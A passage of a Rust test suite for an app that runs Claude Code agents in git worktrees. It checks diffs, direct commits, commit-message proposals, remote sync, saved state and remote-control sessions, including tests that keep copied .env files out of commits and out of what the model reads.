    assert!(!rest.contains("src/app.ts"));
}

#[tokio::test]
async fn the_project_diff_says_why_an_agents_worktree_could_not_be_read() {
    let h = harness("core-project-diff-unreadable");
    let (p, _r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(wt.join("new.ts"), "x\n").unwrap();
    let id = a.meta.id.clone();
    let diff = h.core.worktree_diff(Some(&id)).await.unwrap().unwrap();
    assert!(diff.contains("+++ b/new.ts"), "{diff}");
    // Listed, then broken before its diff is read: its files are not left out without a word.
    std::fs::write(wt.join(".git"), "gitdir: nowhere\n").unwrap();
    let e = h.core.worktree_diff(Some(&id)).await.unwrap_err();
    let said = format!("{e:#}");
    let name = h.core.agent(&id).unwrap().lock().meta.name.clone();
    assert!(
        said.starts_with(&format!("Diff du worktree de « {name} » non lu : ")),
        "{said}"
    );
    // An agent deleted since the list was made has nothing left to show, nor one whose worktree
    // folder went in the meantime (a validation, an archive).
    assert_eq!(h.core.worktree_diff(Some("gone")).await.unwrap(), None);
    h.wait("warm-up", |h| h.alive(&id)).await;
    if let Some(proc) = h.core.agent(&id).unwrap().lock().detach() {
        proc.kill();
    }
    remove_once_let_go(&wt).await;
    assert_eq!(h.core.worktree_diff(Some(&id)).await.unwrap(), None);
}

#[tokio::test]
async fn the_project_diff_is_empty_when_nothing_is_listed() {
    let h = harness("core-project-diff-clean");
    let (p, _r) = h.project(true).await;
    h.core.create_agent(&p.id, None).await.unwrap();
    assert!(h.core.git_project_diff(&p.id).await.unwrap().is_empty());
}

// ---------- direct commit ----------

fn paths_of(scope: &CommitScope) -> Vec<String> {
    let mut paths: Vec<String> = scope.files.iter().map(|f| f.path.clone()).collect();
    paths.sort();
    paths
}

fn strings(list: &[&str]) -> Vec<String> {
    list.iter().map(|s| s.to_string()).collect()
}

#[tokio::test]
async fn a_direct_commit_of_an_agent_takes_its_own_files_and_nothing_else() {
    let h = harness("commit-direct-agent");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.agent(&id).unwrap().lock().meta.touched_files = strings(&["src/app.ts", "src/b.ts"]);
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(r.join("src").join("b.ts"), "const b = 1;\n").unwrap();
    // Not the agent's: left out, even when asked for.
    std::fs::write(r.join("notes.md"), "x\n").unwrap();
    let scope = h
        .core
        .commit_preview(&p.id, Some(id.clone()))
        .await
        .unwrap();
    assert_eq!(paths_of(&scope), ["src/app.ts", "src/b.ts"]);
    assert!(scope.left_out.is_empty());
    let hash = h
        .core
        .commit_direct(
            &p.id,
            Some(id.clone()),
            strings(&["src/app.ts", "src/b.ts", "notes.md"]),
            "feat(api): les fichiers de l'agent\n\nRelu par moi.".into(),
        )
        .await
        .unwrap();
    assert_eq!(hash, git(&r, &["rev-parse", "--short", "HEAD"]));
    assert_eq!(
        git(&r, &["log", "-1", "--format=%B"]),
        "feat(api): les fichiers de l'agent\n\nRelu par moi."
    );
    assert_eq!(
        git(&r, &["show", "--name-only", "--format=", "HEAD"]),
        "src/app.ts\nsrc/b.ts"
    );
    assert_eq!(git(&r, &["status", "--porcelain"]), "?? notes.md");
}

#[tokio::test]
async fn a_direct_commit_of_the_project_leaves_the_agents_worktrees_alone() {
    let h = harness("commit-direct-project");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();
    let scope = h.core.commit_preview(&p.id, None).await.unwrap();
    assert_eq!(paths_of(&scope), ["src/app.ts"]);
    assert!(scope.files.iter().all(|f| !f.in_worktree));
    h.core
        .commit_direct(&p.id, None, paths_of(&scope), "fix: le projet".into())
        .await
        .unwrap();
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "fix: le projet");
    assert_eq!(git(&r, &["status", "--porcelain"]), "");
    // The agent's worktree is committed from its own scope only.
    assert_eq!(git(&wt, &["status", "--porcelain"]), "M src/app.ts");
    let scope = h
        .core
        .commit_preview(&p.id, Some(a.meta.id.clone()))
        .await
        .unwrap();
    h.core
        .commit_direct(
            &p.id,
            Some(a.meta.id),
            paths_of(&scope),
            "feat: l'agent".into(),
        )
        .await
        .unwrap();
    assert_eq!(git(&wt, &["log", "-1", "--format=%s"]), "feat: l'agent");
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "fix: le projet");
}

#[tokio::test]
async fn a_direct_commit_never_takes_nor_shows_haiku_the_files_copied_into_the_worktree() {
    let h = harness("commit-direct-env");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    let id = Some(a.meta.id.clone());
    // The agent's own example file is committed; the copied one it forced into the index is not.
    std::fs::write(wt.join(".env.example"), "SECRET=\n").unwrap();
    git(&wt, &["add", "-f", ".env"]);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let scope = h.core.commit_preview(&p.id, id.clone()).await.unwrap();
    assert_eq!(paths_of(&scope), [".env.example", "src/app.ts"]);
    assert_eq!(scope.left_out, [".env"]);
    // Even asked for (an older list), it stays out of the proposal's diff and of the commit.
    let asked = strings(&[".env", ".env.example", "src/app.ts"]);
    let proposal = h
        .core
        .commit_propose(&p.id, id.clone(), asked.clone())
        .await
        .unwrap();
    // Nor does Haiku read the example: no file matching the copy's patterns goes into its diff.
    assert!(proposal.contains("Diff de : src/app.ts."), "{proposal}");
    h.core
        .commit_direct(&p.id, id, asked, "feat: l'exemple".into())
        .await
        .unwrap();
    assert_eq!(
        git(&wt, &["ls-tree", "-r", "--name-only", "HEAD"]),
        ".env.example\nsrc/app.ts"
    );
    assert_eq!(
        std::fs::read_to_string(wt.join(".env")).unwrap(),
        "SECRET=1\n"
    );
}

/// The project's repository `r` with a committed `.gitignore` that ignores `.env`, and a `.env`.
fn committed_gitignore(r: &Path) {
    std::fs::write(r.join(".gitignore"), ".env\n").unwrap();
    git(r, &["add", ".gitignore"]);
    git(r, &["commit", "-qm", "ignore .env"]);
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
}

#[tokio::test]
async fn a_copied_env_stays_out_even_once_the_agent_no_longer_ignores_it_in_its_worktree() {
    let h = harness("commit-direct-env-unignored");
    let (p, r) = h.project(true).await;
    committed_gitignore(&r);
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    assert_eq!(
        std::fs::read_to_string(wt.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    // The agent's own rules no longer ignore it: git now lists it as a new file.
    std::fs::write(wt.join(".gitignore"), "").unwrap();
    assert!(git(&wt, &["status", "--porcelain"]).contains("?? .env"));
    let id = Some(a.meta.id.clone());
    let scope = h.core.commit_preview(&p.id, id.clone()).await.unwrap();
    assert_eq!(paths_of(&scope), [".gitignore"]);
    assert_eq!(scope.left_out, [".env"]);
    let asked = strings(&[".env", ".gitignore"]);
    let proposal = h
        .core
        .commit_propose(&p.id, id.clone(), asked.clone())
        .await
        .unwrap();
    assert!(proposal.contains("Diff de : .gitignore."), "{proposal}");
    h.core
        .commit_direct(&p.id, id, asked, "chore: les règles".into())
        .await
        .unwrap();
    assert_eq!(
        git(&wt, &["ls-tree", "-r", "--name-only", "HEAD"]),
        ".gitignore\nsrc/app.ts"
    );
}

#[tokio::test]
async fn haiku_never_reads_a_file_matching_the_copy_patterns() {
    let h = harness("commit-propose-env-unread");
    let (p, r) = h.project(false).await;
    committed_gitignore(&r);
    // The project's own rules no longer ignore it: it is listed, for the user to see, but its
    // content is never sent.
    std::fs::write(r.join(".gitignore"), "").unwrap();
    let scope = h.core.commit_preview(&p.id, None).await.unwrap();
    assert_eq!(paths_of(&scope), [".env", ".gitignore"]);
    let proposal = h
        .core
        .commit_propose(&p.id, None, paths_of(&scope))
        .await
        .unwrap();
    assert!(proposal.contains("Diff de : .gitignore."), "{proposal}");
    // Asked for it alone: no diff at all, never the whole checkout's.
    let proposal = h
        .core
        .commit_propose(&p.id, None, strings(&[".env"]))
        .await
        .unwrap();
    assert!(proposal.ends_with("Diff de : ."), "{proposal}");
}

#[tokio::test]
async fn a_direct_commit_and_its_proposal_hold_off_a_restart_while_they_run() {
    let h = harness("commit-direct-working");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let paths = strings(&["src/app.ts"]);
    // What runs alongside sees the work under way, and none once it is over.
    async fn seen_working(h: &Harness, run: impl std::future::Future<Output = ()>) -> bool {
        let done = AtomicBool::new(false);
        let watch = async {
            let mut seen = false;
            while !done.load(Ordering::Acquire) {
                seen |= h.core.works.load(Ordering::Acquire) > 0;
                tokio::time::sleep(Duration::from_millis(1)).await;
            }
            seen
        };
        let run = async {
            run.await;
            done.store(true, Ordering::Release);
        };
        tokio::join!(watch, run).0
    }
    let core = h.core.clone();
    let (pid, asked) = (p.id.clone(), paths.clone());
    let proposing = seen_working(&h, async move {
        core.commit_propose(&pid, None, asked).await.unwrap();
    })
    .await;
    assert!(proposing, "the proposal was never seen under way");
    assert_eq!(h.core.works.load(Ordering::Acquire), 0);
    let core = h.core.clone();
    let committing = seen_working(&h, async move {
        core.commit_direct(&p.id, None, paths, "fix: x".into())
            .await
            .unwrap();
    })
    .await;
    assert!(committing, "the commit was never seen under way");
    assert_eq!(h.core.works.load(Ordering::Acquire), 0);
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "fix: x");
}

#[tokio::test]
async fn a_commit_proposal_follows_the_latest_subjects_of_the_repository() {
    let h = harness("commit-propose-style");
    let (p, r) = h.project(false).await;
    for (file, subject) in [
        ("a.txt", "feat(api): un premier"),
        ("b.txt", "fix(api): un second"),
    ] {
        std::fs::write(r.join(file), "x\n").unwrap();
        git(&r, &["add", file]);
        git(&r, &["commit", "-qm", subject]);
    }
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let proposal = h
        .core
        .commit_propose(&p.id, None, strings(&["src/app.ts"]))
        .await
        .unwrap();
    assert!(
        proposal.contains("D'après « fix(api): un second »"),
        "{proposal}"
    );
    assert!(proposal.contains("Diff de : src/app.ts."), "{proposal}");
    // Proposed only: nothing is committed.
    assert_eq!(
        git(&r, &["log", "-1", "--format=%s"]),
        "fix(api): un second"
    );
}

#[tokio::test]
async fn a_commit_proposal_on_the_checkout_goes_to_an_account_of_the_project() {
    let h = harness("commit-propose-reserved");
    let (p, r) = h.project(false).await;
    // Principal, the only account, kept to this project: no account serves agents of none.
    let principal = h.core.settings.read().accounts[0].clone();
    h.core
        .update_claude_account(Account {
            projects: vec![p.id.clone()],
            ..principal
        })
        .unwrap();
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let proposal = h
        .core
        .commit_propose(&p.id, None, strings(&["src/app.ts"]))
        .await
        .unwrap();
    assert!(proposal.contains("Diff de : src/app.ts."), "{proposal}");
}

/// Principal, the only account, kept to `projects` (« Réservé aux projets »).
fn keep_principal_to(h: &Harness, projects: &[&str]) {
    let principal = h.core.settings.read().accounts[0].clone();
    h.core
        .update_claude_account(Account {
            projects: projects.iter().map(|p| p.to_string()).collect(),
            ..principal
        })
        .unwrap();
}

#[tokio::test]
async fn a_new_project_no_account_would_serve_is_made_without_its_first_agent_and_says_why() {
    let h = harness("new-project-no-account");
    let (p, _) = h.project(false).await;
    keep_principal_to(&h, &[&p.id]);
    let r = repo(&h.dir.join("b"));
    let q = h
        .core
        .create_project(
            &r.to_string_lossy(),
            "client",
            "oklch(0.72 0.12 300)",
            false,
            Some("sonnet".into()),
            true,
        )
        .await
        .unwrap();
    // The project is there, once: it is not made again when the window asks again.
    let same_path = h
        .core
        .projects
        .read()
        .iter()
        .filter(|x| x.path == q.path)
        .count();
    assert_eq!(same_path, 1);
    assert!(h.core.project_agents(&q.id).is_empty());
    let toasts: Vec<String> = h
        .events
        .lock()
        .iter()
        .filter(|e| e["type"] == "toast")
        .map(|e| e["text"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(
        toasts,
        ["Aucun compte Claude Code actif ne sert le projet « client » : coche-le sous « Réservé aux projets » d’un compte Claude Code actif, dans Réglages › Comptes."]
    );
}

#[tokio::test]
async fn a_project_removed_leaves_the_reservations_only_when_its_history_goes_with_it() {
    let h = harness("reserved-removed");
    let (p, _) = h.project(false).await;
    let new_project = |name: &str, dir: &str| {
        let r = repo(&h.dir.join(dir));
        let (core, name) = (h.core.clone(), name.to_string());
        async move {
            core.create_project(
                &r.to_string_lossy(),
                &name,
                "oklch(0.72 0.12 300)",
                false,
                None,
                true,
            )
            .await
            .unwrap()
        }
    };
    let q = new_project("client", "b").await;
    let s = new_project("autre", "c").await;
    keep_principal_to(&h, &[&p.id, &q.id, &s.id]);
    let reserved = || h.core.settings.read().accounts[0].projects.clone();

    // Closed, its history is kept, and so is its place in « Réservé aux projets ».
    h.core.remove_project(&q.id, false).await.unwrap();
    assert_eq!(reserved(), [p.id.as_str(), q.id.as_str(), s.id.as_str()]);
    // Closed with its history erased, nothing of it stays.
    h.core.remove_project(&s.id, true).await.unwrap();
    assert_eq!(reserved(), [p.id.as_str(), q.id.as_str()]);
    // The history erased later: its place goes then.
    h.core.erase_closed_project(&q.id).unwrap();
    assert_eq!(reserved(), [p.id.as_str()]);
}

#[tokio::test]
async fn a_commit_proposal_is_asked_for_in_the_language_of_the_texts_for_claude() {
    let h = harness("commit-propose-en");
    let (p, r) = h.project(false).await;
    h.core.settings.write().claude_language = "en".into();
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let proposal = h
        .core
        .commit_propose(&p.id, None, strings(&["src/app.ts"]))
        .await
        .unwrap();
    // The fake Haiku read the English question: the latest subject, the file whose diff it got,
    // and it says it was asked in English, role and question both.
    assert!(
        proposal.starts_with("feat: proposé par le faux claude (en)\n")
            && proposal.contains("D'après « init »")
            && proposal.contains("Diff de : src/app.ts."),
        "{proposal}"
    );
}

#[tokio::test]
async fn without_claude_code_there_is_no_proposal_and_its_reason_is_given() {
    let h = harness("commit-propose-no-claude");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    h.core.settings.write().claude_path = h.dir.join("absent.cmd").to_string_lossy().to_string();
    let e = h
        .core
        .commit_propose(&p.id, None, strings(&["src/app.ts"]))
        .await
        .unwrap_err();
    assert_eq!(format!("{e:#}"), "claude introuvable");
}

#[tokio::test]
async fn a_direct_commit_needs_a_message_and_something_to_commit() {
    let h = harness("commit-direct-refused");
    let (p, r) = h.project(false).await;
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let e = h
        .core
        .commit_direct(&p.id, None, strings(&["src/app.ts"]), " \n ".into())
        .await
        .unwrap_err();
    assert_eq!(format!("{e:#}"), "Écris le message du commit.");
    let e = h
        .core
        .commit_direct(&p.id, None, strings(&["absent.ts"]), "fix: x".into())
        .await
        .unwrap_err();
    assert_eq!(
        format!("{e:#}"),
        "Plus rien à commiter : ces fichiers n'ont plus de modification."
    );
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "init");
    // Git's own refusal comes back as it is (a hook that says no).
    let hooks = r.join(".git").join("hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    let hook = hooks.join("pre-commit");
    std::fs::write(&hook, "#!/bin/sh\necho 'lint en échec' >&2\nexit 1\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let e = h
        .core
        .commit_direct(&p.id, None, strings(&["src/app.ts"]), "fix: x".into())
        .await
        .unwrap_err();
    assert!(format!("{e:#}").contains("lint en échec"), "{e:#}");
    assert_eq!(git(&r, &["log", "-1", "--format=%s"]), "init");
}

#[tokio::test]
async fn a_commit_in_a_worktree_git_cannot_read_says_gits_error_not_that_nothing_is_left() {
    let h = harness("commit-git-error");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    let id = Some(a.meta.id);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 2;\n").unwrap();
    let asked = strings(&["src/app.ts"]);
    assert_eq!(
        paths_of(&h.core.commit_preview(&p.id, id.clone()).await.unwrap()),
        asked
    );
    // Its `.git` file no longer says where its repository is: git refuses every command in it.
    std::fs::write(wt.join(".git"), "not a gitfile\n").unwrap();
    let said = [
        h.core
            .commit_preview(&p.id, id.clone())
            .await
            .map(|_| ())
            .unwrap_err(),
        h.core
            .commit_propose(&p.id, id.clone(), asked.clone())
            .await
            .unwrap_err(),
        h.core
            .commit_direct(&p.id, id.clone(), asked, "fix: x".into())
            .await
            .unwrap_err(),
    ]
    .map(|e| format!("{e:#}"));
    for said in said {
        // (In English: git runs in the C locale.)
        assert!(said.contains("invalid gitfile format"), "{said}");
        assert!(!said.contains("Plus rien à commiter"), "{said}");
    }
    // The files panel keeps its empty list for that worktree.
    assert!(h.core.git_files(&p.id, id).await.unwrap().is_empty());
}

#[tokio::test]
async fn git_counts_attribute_files_to_the_agent_that_edited_them() {
    let h = harness("git-counts");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "edit").await; // the fake edits src/app.ts (reported only; write it for git)
    std::fs::write(r.join("src").join("app.ts"), "const a = 2;\nconst b = 3;\n").unwrap();
    std::fs::write(r.join("notes.md"), "x\n").unwrap();
    h.core.compute_git(&p.id).await;
    let info = h.core.git_cache.read().get(&p.id).cloned().unwrap();
    assert_eq!((info.modified, info.added, info.total), (1, 1, 2));
    assert_eq!(info.agents.get(&id), Some(&1));
    let files = h.core.git_files(&p.id, Some(id.clone())).await.unwrap();
    assert_eq!(
        files
            .iter()
            .map(|f| (f.path.as_str(), f.add, f.del))
            .collect::<Vec<_>>(),
        vec![("src/app.ts", 2, 1)]
    );
}

/// Gives the project's repository `r` a bare remote (origin, tracked by main) and returns a
/// second clone of it, to push commits the project does not have yet.
fn add_remote(dir: &Path, r: &Path) -> PathBuf {
    let bare = dir.join("remote.git").to_string_lossy().to_string();
    git(dir, &["init", "-q", "--bare", "-b", "main", &bare]);
    git(r, &["remote", "add", "origin", &bare]);
    git(r, &["push", "-qu", "origin", "main"]);
    let other = dir.join("other");
    git(dir, &["clone", "-q", &bare, &other.to_string_lossy()]);
    git(&other, &["config", "core.autocrlf", "false"]);
    other
}

fn git_info(h: &Harness, project_id: &str) -> GitInfo {
    h.core.git_cache.read().get(project_id).cloned().unwrap()
}

#[tokio::test]
async fn git_state_tells_how_the_branch_stands_against_its_remote() {
    let h = harness("git-sync-state");
    let (p, r) = h.project(false).await;
    // Without a remote: nothing fetched, nothing to sync.
    h.core.fetch_all().await;
    h.core.compute_git(&p.id).await;
    let info = git_info(&h, &p.id);
    assert!(!info.has_remote);
    assert_eq!((info.upstream, info.last_fetch), (None, None));

    let other = add_remote(&h.dir, &r);
    commit_change(&other, "const a = 2;\n", "theirs");
    git(&other, &["push", "-q"]);
    commit_change(&r, "const a = 3;\n", "mine");
    h.core.fetch_all().await;
    h.core.compute_git(&p.id).await;
    let info = git_info(&h, &p.id);
    assert!(info.has_remote);
    assert_eq!(info.upstream.as_deref(), Some("origin/main"));
    assert_eq!((info.ahead, info.behind), (1, 1));
    assert!(info.last_fetch.is_some());
    let sent = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "git")
        .cloned()
        .unwrap();
    assert_eq!(sent["git"]["hasRemote"], true);
    assert_eq!(sent["git"]["upstreamGone"], false);
    assert_eq!(sent["git"]["upstream"], "origin/main");
    assert_eq!(
        (sent["git"]["ahead"].clone(), sent["git"]["behind"].clone()),
        (1.into(), 1.into())
    );
    assert!(sent["git"]["lastFetch"].is_i64());
}

#[tokio::test]
async fn fetch_pull_and_push_act_on_the_projects_checkout() {
    let h = harness("git-sync-actions");
    let (p, r) = h.project(false).await;
    let other = add_remote(&h.dir, &r);
    commit_change(&other, "const a = 2;\n", "theirs");
    git(&other, &["push", "-q"]);
    assert_eq!(
        h.core.git_sync(&p.id, SyncOp::Fetch).await.unwrap(),
        "Fetch terminé : 1 commit à tirer"
    );
    assert_eq!(
        h.core.git_sync(&p.id, SyncOp::Pull).await.unwrap(),
        "1 commit tiré"
    );
    commit_change(&r, "const a = 3;\n", "mine");
    assert_eq!(
        h.core.git_sync(&p.id, SyncOp::Push).await.unwrap(),
        "1 commit poussé"
    );
    h.core.compute_git(&p.id).await;
    let info = git_info(&h, &p.id);
    assert_eq!((info.ahead, info.behind), (0, 0));
    assert_eq!(git(&other, &["pull", "-q"]), "");
    assert_eq!(
        std::fs::read_to_string(other.join("src").join("app.ts")).unwrap(),
        "const a = 3;\n"
    );
}

#[tokio::test]
async fn streaming_deltas_reach_the_ui_batched_and_in_order() {
    let h = harness("batch");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.core.flush_conv();
    let ops: Vec<Value> = h
        .events
        .lock()
        .iter()
        .filter(|e| e["type"] == "conv" && e["agentId"] == id.as_str())
        .flat_map(|e| e["ops"].as_array().unwrap().clone())
        .collect();
    let text_id = ops
        .iter()
        .find(|o| o["op"] == "append" && o["item"]["kind"] == "text")
        .unwrap()["item"]["id"]
        .clone();
    let for_text: Vec<&Value> = ops
        .iter()
        .filter(|o| o["id"] == text_id || o["item"]["id"] == text_id)
        .collect();
    let kinds: Vec<&str> = for_text.iter().map(|o| o["op"].as_str().unwrap()).collect();
    assert_eq!(
        kinds,
        vec!["append", "delta", "patch"],
        "the fake streams several chunks, merged into one delta"
    );
    assert_eq!(for_text[1]["text"], "Bonjour, tu as dit : Bonjour");
}

#[tokio::test]
async fn agents_created_at_the_same_time_get_distinct_names() {
    let h = harness("names");
    let (p, _) = h.project(true).await;
    let (a, b) = tokio::join!(
        h.core.create_agent(&p.id, None),
        h.core.create_agent(&p.id, None)
    );
    let (a, b) = (a.unwrap(), b.unwrap());
    assert_ne!(a.meta.name, b.meta.name);
    assert_ne!(a.meta.worktree.unwrap().path, b.meta.worktree.unwrap().path);
}

#[tokio::test]
async fn state_is_saved_and_reloaded_with_the_session() {
    let h = harness("persist");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    let meta = reloaded.agent(&id).unwrap().lock().meta.clone();
    assert_eq!(meta.session_id, h.agent(&id).session_id);
    assert_eq!(meta.status, AgentStatus::Done);
    assert_eq!(
        reloaded.agent(&id).unwrap().lock().conv.items().len(),
        h.items(&id).len()
    );
}

#[tokio::test]
async fn tickets_are_saved_with_the_app_and_projects_keep_their_board() {
    let h = harness("tk-persist");
    let (p, _) = h.project(false).await;
    h.core.tickets.write().push(Ticket {
        id: "t1".into(),
        project_id: p.id.clone(),
        key: "DEM-1".into(),
        title: "Un ticket".into(),
        ..Default::default()
    });
    let copy = vec![".env*".to_string(), "**/.env.local".to_string()];
    h.core
        .update_project(Project {
            worktree_copy: copy.clone(),
            ..p.clone()
        })
        .unwrap();
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    assert_eq!(reloaded.tickets.read()[0].key, "DEM-1");
    let project = reloaded.project(&p.id).unwrap();
    assert_eq!(project.worktree_copy, copy);
    assert_eq!(project.board.max_parallel, 2);
}

#[tokio::test]
async fn the_models_claude_code_runs_reach_the_ui_and_are_kept_for_the_next_launch() {
    let h = harness("models-catalog");
    let (p, _) = h.project(false).await;
    h.core.create_agent(&p.id, None).await.unwrap();
    h.wait("the models", |h| {
        h.events.lock().iter().any(|e| e["type"] == "models")
    })
    .await;
    let event = h
        .events
        .lock()
        .iter()
        .find(|e| e["type"] == "models")
        .cloned()
        .unwrap();
    assert_eq!(
        event["models"][3],
        json!({ "value": "sonnet", "resolvedModel": "claude-sonnet-5-5", "displayName": "Sonnet 5.5",
                "supportsAutoMode": true, "supportsEffort": true,
                "supportedEffortLevels": ["low", "medium", "high", "xhigh", "max"] })
    );
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    let models = reloaded.models.read().clone();
    assert_eq!(models.len(), 6);
    assert_eq!(models[3].value, "sonnet");
    assert_eq!(models[3].resolved_model, "claude-sonnet-5-5");
    // The menu of its account too (ESC-124), `default` aside.
    let menu: Vec<String> = reloaded.account_models.read()["principal"]
        .catalog
        .iter()
        .map(|m| m.id.clone())
        .collect();
    assert_eq!(
        menu,
        [
            "opus",
            "fable",
            "sonnet",
            "haiku",
            "claude-haiku-4-5-20251001"
        ]
    );
}

#[tokio::test]
async fn the_same_models_reported_again_do_not_notify_the_ui_again() {
    let h = harness("models-again");
    let (p, _) = h.project(false).await;
    for _ in 0..2 {
        let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
        h.core.ensure_process(&id).await.unwrap();
    }
    let reports = |h: &Harness| {
        h.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "models")
            .count()
    };
    h.wait("the models", |h| reports(h) > 0).await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(reports(&h), 1);
}

#[tokio::test]
async fn remote_control_links_the_agent_to_claude_ai() {
    let h = harness("remote-on");
    let (p, r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    h.core.set_remote_control(&id, true).await.unwrap();
    let m = h.agent(&id);
    assert!(m.remote_control);
    let session = m.remote_session.clone().expect("remote session kept");
    assert_eq!(
        m.remote_url.as_deref(),
        Some(format!("https://claude.ai/code/session_{}", &session[4..]).as_str())
    );
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["enabled"], true);
    assert_eq!(req["keep_session_on_exit"], true);
    assert_eq!(req["name"], format!("demo · {}", m.name));
    h.wait("link connected", |h| {
        h.core
            .agent(&id)
            .unwrap()
            .lock()
            .view()
            .remote_state
            .as_deref()
            == Some("connected")
    })
    .await;
    // Messages sent from claude.ai are re-emitted to the app.
    assert!(h
        .launches(&r)
        .last()
        .unwrap()
        .contains(&"--replay-user-messages".to_string()));
}

#[tokio::test]
async fn a_remote_agent_gets_its_remote_session_back_after_a_restart() {
    let h = harness("remote-reattach");
    let (p, r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    h.core.set_remote_control(&id, true).await.unwrap();
    let session = h.agent(&id).remote_session.unwrap();
    let old = h.core.agent(&id).unwrap().lock().detach().unwrap();
    old.close_input();
    h.core.ensure_process(&id).await.unwrap();
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["reattach_session_id"], session.as_str());
    assert_eq!(
        h.agent(&id).remote_session.as_deref(),
        Some(session.as_str())
    );
}

#[tokio::test]
async fn remote_agents_stay_reachable_instead_of_being_idle_stopped() {
    let h = harness("remote-idle");
    let (p, _) = h.project(false).await;
    let remote = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let local = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&remote, true).await.unwrap();
    h.core.ensure_process(&local).await.unwrap();
    for id in [&remote, &local] {
        h.core.agent(id).unwrap().lock().meta.last_activity = 0;
    }
    h.core.stop_idle_processes();
    assert!(h.alive(&remote));
    assert!(!h.alive(&local));
}

#[tokio::test]
async fn turning_remote_control_off_ends_the_remote_session() {
    let h = harness("remote-off");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&id, true).await.unwrap();
    let session = h.agent(&id).remote_session.unwrap();
    let asked = h.remote_requests(&r).len();
    h.core.set_remote_control(&id, false).await.unwrap();
    let m = h.agent(&id);
    assert!(!m.remote_control);
    assert_eq!((m.remote_session, m.remote_url), (None, None));
    assert_eq!(h.remote_requests(&r).pop().unwrap()["enabled"], false);
    h.assert_remote_closed(&r, asked, &session, &format!("demo · {}", m.name));
}

impl Harness {
    /// The requests the fake CLI got in `cwd` after the first `asked` are the three that end the
    /// remote session `session` for good (a plain « off » leaves a session opened to be kept on
    /// claude.ai, orphan): off, reattached without keeping it, off. The fake archived it.
    pub(crate) fn assert_remote_closed(&self, cwd: &Path, asked: usize, session: &str, name: &str) {
        let tail = self.remote_requests(cwd).split_off(asked);
        assert_eq!(tail.len(), 3, "{tail:?}");
        assert_eq!(tail[0]["enabled"], false, "{tail:?}");
        assert_eq!(tail[1]["subtype"], "remote_control", "{tail:?}");
        assert_eq!(tail[1]["enabled"], true, "{tail:?}");
        assert_eq!(tail[1]["reattach_session_id"], session, "{tail:?}");
        assert_eq!(tail[1]["keep_session_on_exit"], false, "{tail:?}");
        assert_eq!(tail[1]["name"], name, "{tail:?}");
        assert_eq!(tail[2]["enabled"], false, "{tail:?}");
        assert_eq!(
            self.fake_log(cwd, "archived"),
            [json!({ "bridge": session })]
        );
    }
}

#[tokio::test]
async fn a_remote_session_with_no_known_id_is_turned_off_with_a_single_request() {
    let h = harness("remote-off-no-id");
    let (p, r) = h.project(false).await;
